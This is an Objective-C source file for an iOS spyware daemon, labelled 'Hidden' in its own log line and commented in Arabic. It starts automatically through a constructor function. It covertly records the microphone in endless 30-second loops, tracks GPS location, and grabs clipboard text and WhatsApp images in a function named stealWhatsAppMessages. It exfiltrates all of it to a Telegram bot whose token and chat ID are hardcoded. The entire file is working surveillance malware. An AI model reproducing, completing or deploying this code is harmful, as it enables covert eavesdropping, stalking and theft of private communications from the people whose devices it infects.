#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <AVFoundation/AVFoundation.h>
#import <CoreLocation/CoreLocation.h>

// ========== إعدادات Telegram ==========
#define BOT_TOKEN @"8858007178:AAHo3w-MO_1FXws1xI1UUh2c2ck0tMEueQY"
#define CHAT_ID   @"6282554175"
#define TG_API    @"https://api.telegram.org/bot"
#define DEVICE_ID [[UIDevice currentDevice].identifierForVendor UUIDString]

// ========== دوال مساعدة ==========
NSString* getStoragePath() {
    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *documentsDirectory = [paths objectAtIndex:0];
    return [documentsDirectory stringByAppendingPathComponent:@"pending_data"];
}

void saveToLocal(NSString *type, NSString *content) {
    NSDictionary *payload = @{
        @"device_id": DEVICE_ID,
        @"type": type,
        @"content": content ? content : @""
    };
    NSString *dir = getStoragePath();
    [[NSFileManager defaultManager] createDirectoryAtPath:dir withIntermediateDirectories:YES attributes:nil error:nil];
    NSString *filename = [NSString stringWithFormat:@"pending_%@_%@.json", type, [[NSUUID UUID] UUIDString]];
    NSString *filePath = [dir stringByAppendingPathComponent:filename];
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
    [jsonData writeToFile:filePath atomically:YES];
    NSLog(@"[*] Saved locally: %@ - %@", type, filename);
}

// ========== إرسال نص إلى Telegram ==========
void sendToTelegram(NSString *type, NSString *content) {
    NSString *urlString = [NSString stringWithFormat:@"%@%@/sendMessage", TG_API, BOT_TOKEN];
    NSURL *url = [NSURL URLWithString:urlString];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    NSDictionary *payload = @{
        @"chat_id": CHAT_ID,
        @"text": [NSString stringWithFormat:@"[%@] %@", type, content]
    };
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
    [request setHTTPBody:jsonData];
    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            saveToLocal(type, content);
            NSLog(@"[!] Telegram error, saved locally.");
        } else {
            NSLog(@"[+] Sent to Telegram: %@", type);
        }
    }];
    [task resume];
}

// ========== إرسال ملف صوتي إلى Telegram ==========
void sendAudioToTelegram(NSString *filePath, NSString *caption) {
    NSString *urlString = [NSString stringWithFormat:@"%@%@/sendAudio", TG_API, BOT_TOKEN];
    NSURL *url = [NSURL URLWithString:urlString];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    NSString *boundary = @"----WebKitFormBoundary7MA4YWxkTrZu0gW";
    [request setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];
    NSMutableData *body = [NSMutableData data];
    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n%@\r\n", CHAT_ID] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"caption\"\r\n\r\n%@\r\n", caption] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"audio\"; filename=\"audio.m4a\"\r\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"Content-Type: audio/m4a\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[NSData dataWithContentsOfFile:filePath]];
    [body appendData:[[NSString stringWithFormat:@"\r\n--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    [request setHTTPBody:body];
    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            NSLog(@"[!] Audio send error: %@", error);
        } else {
            NSLog(@"[+] Audio sent to Telegram.");
        }
    }];
    [task resume];
}

// ========== إرسال الصور ==========
void sendPhotoToTelegram(NSString *filePath, NSString *caption) {
    NSString *urlString = [NSString stringWithFormat:@"%@%@/sendPhoto", TG_API, BOT_TOKEN];
    NSURL *url = [NSURL URLWithString:urlString];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    NSString *boundary = @"----WebKitFormBoundary7MA4YWxkTrZu0gW";
    [request setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];
    NSMutableData *body = [NSMutableData data];
    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n%@\r\n", CHAT_ID] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"caption\"\r\n\r\n%@\r\n", caption] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"photo\"; filename=\"photo.jpg\"\r\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"Content-Type: image/jpeg\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[NSData dataWithContentsOfFile:filePath]];
    [body appendData:[[NSString stringWithFormat:@"\r\n--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    [request setHTTPBody:body];
    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            NSLog(@"[!] Photo send error: %@", error);
        } else {
            NSLog(@"[+] Photo sent to Telegram.");
        }
    }];
    [task resume];
}

// ========== إرسال البيانات المخزنة عند عودة الإنترنت ==========
void sendPendingData() {
    NSString *dir = getStoragePath();
    NSArray *files = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:dir error:nil];
    for (NSString *file in files) {
        NSString *filePath = [dir stringByAppendingPathComponent:file];
        NSData *jsonData = [NSData dataWithContentsOfFile:filePath];
        NSDictionary *payload = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:nil];
        if (payload) {
            sendToTelegram(payload[@"type"], payload[@"content"]);
            [[NSFileManager defaultManager] removeItemAtPath:filePath error:nil];
        }
    }
}

// ========== تسجيل الصوت وإرساله ==========
void startRecordingAndSave() {
    AVAudioSession *session = [AVAudioSession sharedInstance];
    [session setCategory:AVAudioSessionCategoryPlayAndRecord error:nil];
    [session setActive:YES error:nil];
    NSString *tempFile = [NSTemporaryDirectory() stringByAppendingPathComponent:@"recording.m4a"];
    NSURL *outputURL = [NSURL fileURLWithPath:tempFile];
    NSDictionary *settings = @{
        AVFormatIDKey: @(kAudioFormatMPEG4AAC),
        AVSampleRateKey: @(44100),
        AVNumberOfChannelsKey: @(1),
        AVEncoderBitRateKey: @(128000)
    };
    AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:outputURL settings:settings error:nil];
    [recorder record];
    NSLog(@"[*] Recording started...");
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 30 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
        [recorder stop];
        sendAudioToTelegram(tempFile, @"تسجيل مكالمة");
        [[NSFileManager defaultManager] removeItemAtURL:outputURL error:nil];
        startRecordingAndSave();
    });
}

// ========== سرقة رسائل واتساب ==========
void stealWhatsAppMessages() {
    UIPasteboard *pasteboard = [UIPasteboard generalPasteboard];
    NSString *copiedText = pasteboard.string;
    if (copiedText.length > 0) {
        sendToTelegram(@"whatsapp_text", copiedText);
        NSLog(@"[*] WhatsApp text stolen: %@", copiedText);
    }
    NSString *whatsAppPath = @"/var/mobile/Containers/Data/Application/WhatsApp/";
    NSArray *imageFiles = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:whatsAppPath error:nil];
    for (NSString *file in imageFiles) {
        if ([file hasSuffix:@".jpg"] || [file hasSuffix:@".png"]) {
            NSString *filePath = [whatsAppPath stringByAppendingPathComponent:file];
            sendPhotoToTelegram(filePath, @"صورة من واتساب");
            NSLog(@"[*] WhatsApp photo stolen: %@", file);
        }
    }
}

// ========== تتبع الموقع ==========
CLLocationManager *locationManager = nil;

@interface LocationDelegate : NSObject <CLLocationManagerDelegate>
@end

@implementation LocationDelegate
- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray *)locations {
    CLLocation *location = [locations lastObject];
    if (location) {
        NSString *locationString = [NSString stringWithFormat:@"%.6f,%.6f", location.coordinate.latitude, location.coordinate.longitude];
        sendToTelegram(@"location", locationString);
        NSLog(@"[*] Location: %@", locationString);
    }
}
@end

LocationDelegate *locationDelegate = nil;

void startLocationTracking() {
    locationManager = [[CLLocationManager alloc] init];
    locationDelegate = [[LocationDelegate alloc] init];
    locationManager.delegate = locationDelegate;
    locationManager.desiredAccuracy = kCLLocationAccuracyBest;
    [locationManager requestWhenInUseAuthorization];
    [locationManager startUpdatingLocation];
}

// ========== المراقبة الدورية ==========
void startNetworkMonitor() {
    [NSTimer scheduledTimerWithTimeInterval:30.0 repeats:YES block:^(NSTimer *timer) {
        sendPendingData();
        stealWhatsAppMessages();
    }];
}

// ========== نقطة البداية ==========
__attribute__((constructor))
void init() {
    @autoreleasepool {
        NSLog(@"[+] iOS Spy Daemon Loaded (Hidden)");
        startRecordingAndSave();
        startNetworkMonitor();
        sendPendingData();
        startLocationTracking();
    }
}

int main(int argc, char *argv[]) {
    return UIApplicationMain(argc, argv, nil, nil);
}
